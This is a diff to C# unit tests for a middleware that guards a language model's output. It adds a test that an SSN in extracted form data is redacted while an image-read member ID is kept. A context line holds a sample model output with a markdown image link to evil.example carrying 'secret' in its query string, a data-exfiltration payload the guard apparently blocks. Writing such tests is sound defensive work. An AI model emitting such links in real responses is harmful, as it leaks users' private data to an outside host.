@@ -108,6 +108,19 @@ public sealed class GuardrailMiddlewareTests
     }
 
     [Fact]
+    public async Task IdentifiersReadFromAnImageAreKept()
+    {
+        // The intake form extractor (chapter 4) reads the member ID from a scan: the ground text cannot contain it.
+        var model = new RecordingChatClient(_ => "{\"memberId\":\"DD-5820317\",\"ssn\":\"123-45-6789\"}");
+        using var client = new OutputGuardChatClient(model, new OutputGuard(new SecurityOptions()), NullLogger<OutputGuardChatClient>.Instance);
+        var request = new ChatMessage(ChatRole.User, [new TextContent("Extract the intake form."), new DataContent(new byte[] { 0x89, 0x50, 0x4E, 0x47 }, "image/png")]);
+
+        var response = await client.GetResponseAsync([request], cancellationToken: Ct);
+
+        Assert.Equal("{\"memberId\":\"DD-5820317\",\"ssn\":\"[SSN]\"}", response.Text);
+    }
+
+    [Fact]
     public async Task StreamingHoldsBackALinkUntilItsLineIsComplete()
     {
         var model = new TokenStream("Carryover is 40 hours [1].\n", "See ![x](https://evil", ".example/p.png?d=", "secret) for more.\n", "Done.");
